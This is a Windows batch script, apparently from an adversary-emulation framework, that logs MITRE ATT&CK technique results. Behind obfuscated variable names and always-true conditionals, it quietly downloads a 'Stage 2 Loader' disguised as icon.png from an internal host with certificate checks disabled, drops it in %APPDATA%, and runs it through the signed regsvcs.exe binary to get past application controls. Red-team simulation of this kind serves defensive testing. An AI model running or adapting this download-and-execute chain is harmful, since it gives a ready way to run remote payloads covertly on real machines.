@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM --- Obfuscation preamble: random variable names for PHR_ payloads ---
SET akjdhm=%APPDATA%\10409\bcf5b5e8
SET qwzxpl=63b13aa9.txt
SET mnbvfg=https://10.0.0.49/stage/2/icon.png?10409-7
SET plkmjv=ITZEL-S2BO
SET vbnmcx=10409
SET ghzxpq=7

REM --- Initialize log path and timestamp ---
SET logfile=%APPDATA%\!ghzxpq!\macula-simulations.log
SET tsvar=!DATE!/!TIME!

REM --- Opaque predicate wrapper (always true) ---
if not defined xcvbnm (
    set xcvbnm=1
    REM --- Ensure log directory exists ---
    if not exist "%APPDATA%\!ghzxpq!" mkdir "%APPDATA%\!ghzxpq!" >nul 2>&1

    REM -------- STEP 1: Heartbeat fetch (download Stage 2 Loader) --------
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_start>> "!logfile!" 2>nul
    curl -k -s -o "!akjdhm!\!qwzxpl!" "!mnbvfg!" >nul 2>&1
    set heartbeat_rc=!errorlevel!
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_complete=!heartbeat_rc!>> "!logfile!" 2>nul

    REM -------- STEP 2: Change working directory to output dir --------
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_start>> "!logfile!" 2>nul
    cd /d "!akjdhm!" 2>nul
    set chdir_rc=!errorlevel!
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_result=!chdir_rc!>> "!logfile!" 2>nul

    REM --- Nested conditionals (obfuscation layer) ---
    if 1 EQU 1 (
        if not defined qweasd (
            set qweasd=0
            REM -------- STEP 3: Invoke Stage 2 Loader via regsvcs.exe /U --------
            echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: regsvcs_start>> "!logfile!" 2>nul
            %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!qwzxpl!" >NUL 2>&1
            set regsvcs_rc=!errorlevel!
            echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: regsvcs_result=!regsvcs_rc!>> "!logfile!" 2>nul

            REM TTP logging: T1218 - System Binary Proxy Execution
            if !regsvcs_rc! EQU 0 (
                echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!"
            ) else (
                echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[FAIL]:[regsvcs_failed]>> "!logfile!"
            )
        )
    )

    REM -------- STEP 4: Obfuscation (compile-time transformation, always logged as OK) --------
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!logfile!"
)